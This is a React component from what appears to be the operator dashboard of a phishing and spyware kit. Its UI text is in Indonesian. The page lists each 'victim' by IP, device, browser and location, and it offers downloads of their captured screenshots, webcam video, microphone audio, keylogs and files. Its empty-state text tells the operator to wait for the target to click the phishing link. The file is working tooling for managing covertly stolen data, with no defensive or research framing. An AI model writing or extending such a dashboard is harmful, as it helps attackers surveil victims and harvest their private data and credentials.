import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaDownload, FaImage, FaVideo, FaMicrophone, FaKeyboard, FaFile } from 'react-icons/fa';
import Navbar from '../components/Navbar';
import Sidebar from '../components/Sidebar';
import api from '../api/axios';
import toast from 'react-hot-toast';

const VictimDetail = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [victim, setVictim] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchVictimDetail();
  }, [id]);

  const fetchVictimDetail = async () => {
    try {
      const res = await api.get(`/victims/${id}`);
      setVictim(res.data);
    } catch (err) {
      toast.error('Gagal ambil detail victim');
      navigate('/results');
    } finally {
      setLoading(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-primary flex items-center justify-center">
        <div className="text-accent text-xl animate-pulse">Loading...</div>
      </div>
    );
  }

  if (!victim) {
    return (
      <div className="min-h-screen bg-primary flex items-center justify-center">
        <div className="text-gray-500">Victim tidak ditemukan</div>
      </div>
    );
  }

  const dataTypes = [
    { key: 'screenshots', icon: <FaImage />, label: 'Screenshots' },
    { key: 'webcam', icon: <FaVideo />, label: 'Webcam' },
    { key: 'audio', icon: <FaMicrophone />, label: 'Audio' },
    { key: 'keylogs', icon: <FaKeyboard />, label: 'Keylogs' },
    { key: 'files', icon: <FaFile />, label: 'Files' },
  ];

  const hasData = dataTypes.some((type) => victim.data?.[type.key]?.length > 0);

  return (
    <div className="min-h-screen bg-primary flex">
      <Sidebar />
      <div className="flex-1">
        <Navbar />
        <main className="p-6">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <button
              onClick={() => navigate('/results')}
              className="flex items-center gap-2 text-gray-400 hover:text-white transition mb-4"
            >
              <FaArrowLeft /> Kembali
            </button>

            <div className="glass-effect rounded-xl p-6 glow-border">
              <div className="flex items-center justify-between mb-6">
                <div>
                  <h2 className="text-2xl font-bold glow-text">Target: {victim.ip}</h2>
                  <div className="flex gap-4 mt-2 text-sm text-gray-400">
                    <span>Device: {victim.device}</span>
                    <span>Browser: {victim.browser}</span>
                    <span>Location: {victim.location}</span>
                  </div>
                </div>
                <span className={`text-xs px-3 py-1 rounded ${
                  victim.status === 'online' ? 'bg-cyber/20 text-cyber' : 'bg-gray-700 text-gray-400'
                }`}>
                  {victim.status || 'offline'}
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {dataTypes.map((type) => {
                  const items = victim.data?.[type.key] || [];
                  return (
                    <div key={type.key} className="bg-dark/30 rounded-lg p-4">
                      <div className="flex items-center justify-between mb-3">
                        <div className="flex items-center gap-2">
                          <span className="text-accent">{type.icon}</span>
                          <span className="font-semibold">{type.label}</span>
                        </div>
                        <span className="text-xs text-gray-500">{items.length} files</span>
                      </div>
                      {items.length === 0 ? (
                        <p className="text-gray-500 text-sm">Belum ada data</p>
                      ) : (
                        <div className="space-y-2 max-h-40 overflow-y-auto">
                          {items.map((item, i) => (
                            <div key={i} className="flex items-center justify-between bg-dark/50 px-3 py-2 rounded">
                              <span className="text-sm text-gray-300 truncate">{item.filename || `File ${i+1}`}</span>
                              <button className="text-accent hover:text-glow transition">
                                <FaDownload />
                              </button>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>

              {!hasData && (
                <div className="text-center py-8 text-gray-500">
                  <p>Belum ada data sadapan dari target ini</p>
                  <p className="text-sm">Tunggu target berinteraksi dengan link phising</p>
                </div>
              )}
            </div>
          </motion.div>
        </main>
      </div>
    </div>
  );
};

export default VictimDetail;
